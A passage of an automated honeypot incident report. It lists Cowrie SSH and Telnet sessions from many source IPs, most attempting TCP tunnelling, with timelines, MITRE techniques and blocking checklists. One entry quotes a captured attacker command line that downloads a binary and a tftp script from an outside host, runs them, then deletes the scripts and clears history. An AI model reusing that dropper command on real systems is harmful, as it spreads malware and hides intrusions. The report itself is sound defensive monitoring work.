| `2026-07-29 17:55:46` | `cowrie.client.version` |
| `2026-07-29 17:55:46` | `cowrie.client.kex` |
| `2026-07-29 17:55:49` | `cowrie.login.success` |
| `2026-07-29 17:55:50` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:55:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:55:50` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c4aaccbec3

| Field | Detail |
|---|---|
| **Source IP** | `186.103.136[.]43` |
| **First Seen** | 2026-07-29 17:56 |
| **Last Seen** | 2026-07-29 17:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:56:40` | `cowrie.session.connect` |
| `2026-07-29 17:56:41` | `cowrie.client.version` |
| `2026-07-29 17:56:41` | `cowrie.client.kex` |
| `2026-07-29 17:56:43` | `cowrie.login.success` |
| `2026-07-29 17:56:44` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.136[.]43` to AbuseIPDB if not already reported
- [ ] Block `186.103.136[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-584cf28228c1

| Field | Detail |
|---|---|
| **Source IP** | `191.241.142[.]170` |
| **First Seen** | 2026-07-29 17:56 |
| **Last Seen** | 2026-07-29 17:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:56:49` | `cowrie.session.connect` |
| `2026-07-29 17:56:50` | `cowrie.client.version` |
| `2026-07-29 17:56:50` | `cowrie.client.kex` |
| `2026-07-29 17:56:52` | `cowrie.login.success` |
| `2026-07-29 17:56:53` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.241.142[.]170` to AbuseIPDB if not already reported
- [ ] Block `191.241.142[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07ddbd1a8122

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-29 17:56 |
| **Last Seen** | 2026-07-29 17:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:56:49` | `cowrie.session.connect` |
| `2026-07-29 17:56:49` | `cowrie.client.version` |
| `2026-07-29 17:56:50` | `cowrie.client.kex` |
| `2026-07-29 17:56:50` | `cowrie.login.success` |
| `2026-07-29 17:56:50` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:56:50` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3a0dceab3c

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 17:58 |
| **Last Seen** | 2026-07-29 17:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 17:58:10` | `cowrie.session.connect` |
| `2026-07-29 17:58:11` | `cowrie.client.version` |
| `2026-07-29 17:58:11` | `cowrie.client.kex` |
| `2026-07-29 17:58:12` | `cowrie.login.success` |
| `2026-07-29 17:58:12` | `cowrie.direct-tcpip.request` |
| `2026-07-29 17:58:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 17:58:13` | `cowrie.direct-tcpip.data` |
| `2026-07-29 17:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-610a2bf10319

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 18:00 |
| **Last Seen** | 2026-07-29 18:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:00:37` | `cowrie.session.connect` |
| `2026-07-29 18:00:37` | `cowrie.client.version` |
| `2026-07-29 18:00:40` | `cowrie.client.kex` |
| `2026-07-29 18:00:44` | `cowrie.login.success` |
| `2026-07-29 18:00:44` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:00:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 18:00:45` | `cowrie.direct-tcpip.data` |
| `2026-07-29 18:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af68f796445

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 18:00 |
| **Last Seen** | 2026-07-29 18:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:00:47` | `cowrie.session.connect` |
| `2026-07-29 18:00:47` | `cowrie.client.version` |
| `2026-07-29 18:00:48` | `cowrie.client.kex` |
| `2026-07-29 18:00:49` | `cowrie.login.success` |
| `2026-07-29 18:00:49` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:00:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 18:00:50` | `cowrie.direct-tcpip.data` |
| `2026-07-29 18:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a822c4de008

| Field | Detail |
|---|---|
| **Source IP** | `27.50.29[.]181` |
| **First Seen** | 2026-07-29 18:02 |
| **Last Seen** | 2026-07-29 18:03 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:02:30` | `cowrie.session.connect` |
| `2026-07-29 18:02:32` | `cowrie.client.version` |
| `2026-07-29 18:02:32` | `cowrie.client.kex` |
| `2026-07-29 18:02:48` | `cowrie.login.success` |
| `2026-07-29 18:03:02` | `cowrie.session.params` |
| `2026-07-29 18:03:02` | `cowrie.command.input` |
| `2026-07-29 18:03:18` | `cowrie.log.closed` |
| `2026-07-29 18:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.50.29[.]181` to AbuseIPDB if not already reported
- [ ] Block `27.50.29[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f6edf2b7498

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 18:04 |
| **Last Seen** | 2026-07-29 18:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:04:26` | `cowrie.session.connect` |
| `2026-07-29 18:04:26` | `cowrie.client.version` |
| `2026-07-29 18:04:27` | `cowrie.client.kex` |
| `2026-07-29 18:04:29` | `cowrie.login.success` |
| `2026-07-29 18:04:29` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:04:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 18:04:30` | `cowrie.direct-tcpip.data` |
| `2026-07-29 18:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d60794054cf

| Field | Detail |
|---|---|
| **Source IP** | `27.79.2[.]68` |
| **First Seen** | 2026-07-29 18:04 |
| **Last Seen** | 2026-07-29 18:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:04:38` | `cowrie.session.connect` |
| `2026-07-29 18:04:38` | `cowrie.client.version` |
| `2026-07-29 18:04:39` | `cowrie.client.kex` |
| `2026-07-29 18:04:40` | `cowrie.login.success` |
| `2026-07-29 18:04:40` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:04:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 18:04:40` | `cowrie.direct-tcpip.data` |
| `2026-07-29 18:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.2[.]68` to AbuseIPDB if not already reported
- [ ] Block `27.79.2[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b69ef500e2ac

| Field | Detail |
|---|---|
| **Source IP** | `41.214.10[.]178` |
| **First Seen** | 2026-07-29 18:07 |
| **Last Seen** | 2026-07-29 18:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:07:07` | `cowrie.session.connect` |
| `2026-07-29 18:07:08` | `cowrie.client.version` |
| `2026-07-29 18:07:08` | `cowrie.client.kex` |
| `2026-07-29 18:07:09` | `cowrie.login.success` |
| `2026-07-29 18:07:09` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.214.10[.]178` to AbuseIPDB if not already reported
- [ ] Block `41.214.10[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8f918d2716a

| Field | Detail |
|---|---|
| **Source IP** | `118.113.164[.]137` |
| **First Seen** | 2026-07-29 18:07 |
| **Last Seen** | 2026-07-29 18:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:07:15` | `cowrie.session.connect` |
| `2026-07-29 18:07:16` | `cowrie.client.version` |
| `2026-07-29 18:07:16` | `cowrie.client.kex` |
| `2026-07-29 18:07:19` | `cowrie.login.success` |
| `2026-07-29 18:07:20` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.113.164[.]137` to AbuseIPDB if not already reported
- [ ] Block `118.113.164[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81fdabeafb32

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 18:08 |
| **Last Seen** | 2026-07-29 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:08:38` | `cowrie.session.connect` |
| `2026-07-29 18:08:38` | `cowrie.client.version` |
| `2026-07-29 18:08:38` | `cowrie.client.kex` |
| `2026-07-29 18:08:39` | `cowrie.login.success` |
| `2026-07-29 18:08:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b855900ff9d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 18:08 |
| **Last Seen** | 2026-07-29 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:08:38` | `cowrie.session.connect` |
| `2026-07-29 18:08:38` | `cowrie.client.version` |
| `2026-07-29 18:08:39` | `cowrie.client.kex` |
| `2026-07-29 18:08:39` | `cowrie.login.success` |
| `2026-07-29 18:08:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9ffefaafaf1

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 18:08 |
| **Last Seen** | 2026-07-29 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:08:49` | `cowrie.session.connect` |
| `2026-07-29 18:08:49` | `cowrie.client.version` |
| `2026-07-29 18:08:49` | `cowrie.client.kex` |
| `2026-07-29 18:08:50` | `cowrie.login.success` |
| `2026-07-29 18:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33dd19d1740a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 18:08 |
| **Last Seen** | 2026-07-29 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:08:50` | `cowrie.session.connect` |
| `2026-07-29 18:08:50` | `cowrie.client.version` |
| `2026-07-29 18:08:50` | `cowrie.client.kex` |
| `2026-07-29 18:08:51` | `cowrie.login.success` |
| `2026-07-29 18:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d517686cc78

| Field | Detail |
|---|---|
| **Source IP** | `171.243.150[.]132` |
| **First Seen** | 2026-07-29 18:09 |
| **Last Seen** | 2026-07-29 18:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:09:02` | `cowrie.session.connect` |
| `2026-07-29 18:09:02` | `cowrie.client.version` |
| `2026-07-29 18:09:02` | `cowrie.client.kex` |
| `2026-07-29 18:09:03` | `cowrie.login.success` |
| `2026-07-29 18:09:03` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:09:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-29 18:09:03` | `cowrie.direct-tcpip.data` |
| `2026-07-29 18:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.150[.]132` to AbuseIPDB if not already reported
- [ ] Block `171.243.150[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fba2f5506e61

| Field | Detail |
|---|---|
| **Source IP** | `122.187.229[.]12` |
| **First Seen** | 2026-07-29 18:12 |
| **Last Seen** | 2026-07-29 18:12 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:12:04` | `cowrie.session.connect` |
| `2026-07-29 18:12:05` | `cowrie.client.version` |
| `2026-07-29 18:12:05` | `cowrie.client.kex` |
| `2026-07-29 18:12:11` | `cowrie.login.success` |
| `2026-07-29 18:12:12` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.229[.]12` to AbuseIPDB if not already reported
- [ ] Block `122.187.229[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73c86e9ad897

| Field | Detail |
|---|---|
| **Source IP** | `77.106.78[.]215` |
| **First Seen** | 2026-07-29 18:12 |
| **Last Seen** | 2026-07-29 18:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:12:22` | `cowrie.session.connect` |
| `2026-07-29 18:12:23` | `cowrie.client.version` |
| `2026-07-29 18:12:23` | `cowrie.client.kex` |
| `2026-07-29 18:12:24` | `cowrie.login.success` |
| `2026-07-29 18:12:25` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.106.78[.]215` to AbuseIPDB if not already reported
- [ ] Block `77.106.78[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cd7a380dc3b

| Field | Detail |
|---|---|
| **Source IP** | `47.252.16[.]44` |
| **First Seen** | 2026-07-29 18:21 |
| **Last Seen** | 2026-07-29 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:21:49` | `cowrie.session.connect` |
| `2026-07-29 18:21:49` | `cowrie.telnet.option` |
| `2026-07-29 18:21:49` | `cowrie.telnet.option` |
| `2026-07-29 18:22:49` | `cowrie.login.success` |
| `2026-07-29 18:22:50` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `47.252.16[.]44` to AbuseIPDB if not already reported
- [ ] Block `47.252.16[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c979a57f8039

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]140` |
| **First Seen** | 2026-07-29 18:30 |
| **Last Seen** | 2026-07-29 18:30 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.69[.]141/armv7l; chmod +x; armv7l; tftp -g 83.168.69[.]141 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.69[.]141/armv7l |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:30:41` | `cowrie.session.connect` |
| `2026-07-29 18:30:42` | `cowrie.login.success` |
| `2026-07-29 18:30:42` | `cowrie.session.params` |
| `2026-07-29 18:30:44` | `cowrie.command.input` |
| `2026-07-29 18:30:44` | `cowrie.command.input` |
| `2026-07-29 18:30:44` | `cowrie.session.file_download` |
| `2026-07-29 18:30:59` | `cowrie.log.closed` |
| `2026-07-29 18:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]140` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f573968dadb

| Field | Detail |
|---|---|
| **Source IP** | `103.67.152[.]201` |
| **First Seen** | 2026-07-29 18:31 |
| **Last Seen** | 2026-07-29 18:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:31:31` | `cowrie.session.connect` |
| `2026-07-29 18:31:32` | `cowrie.client.version` |
| `2026-07-29 18:31:32` | `cowrie.client.kex` |
| `2026-07-29 18:31:34` | `cowrie.login.success` |
| `2026-07-29 18:31:35` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.152[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.67.152[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af444a897ad7

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-07-29 18:31 |
| **Last Seen** | 2026-07-29 18:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:31:45` | `cowrie.session.connect` |
| `2026-07-29 18:31:45` | `cowrie.client.version` |
| `2026-07-29 18:31:45` | `cowrie.client.kex` |
| `2026-07-29 18:31:47` | `cowrie.login.success` |
| `2026-07-29 18:31:47` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:31:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4505be7d7d92

| Field | Detail |
|---|---|
| **Source IP** | `50.187.155[.]130` |
| **First Seen** | 2026-07-29 18:32 |
| **Last Seen** | 2026-07-29 18:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:32:45` | `cowrie.session.connect` |
| `2026-07-29 18:32:46` | `cowrie.client.version` |
| `2026-07-29 18:32:46` | `cowrie.client.kex` |
| `2026-07-29 18:32:48` | `cowrie.login.success` |
| `2026-07-29 18:32:48` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.187.155[.]130` to AbuseIPDB if not already reported
- [ ] Block `50.187.155[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f25c02b618f0

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-07-29 18:32 |
| **Last Seen** | 2026-07-29 18:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:32:53` | `cowrie.session.connect` |
| `2026-07-29 18:32:54` | `cowrie.client.version` |
| `2026-07-29 18:32:54` | `cowrie.client.kex` |
| `2026-07-29 18:32:55` | `cowrie.login.success` |
| `2026-07-29 18:32:56` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2642c8415aa

| Field | Detail |
|---|---|
| **Source IP** | `122.160.50[.]155` |
| **First Seen** | 2026-07-29 18:32 |
| **Last Seen** | 2026-07-29 18:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:32:54` | `cowrie.session.connect` |
| `2026-07-29 18:32:55` | `cowrie.client.version` |
| `2026-07-29 18:32:55` | `cowrie.client.kex` |
| `2026-07-29 18:32:57` | `cowrie.login.success` |
| `2026-07-29 18:32:58` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:33:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.50[.]155` to AbuseIPDB if not already reported
- [ ] Block `122.160.50[.]155` at perimeter firewall / security group
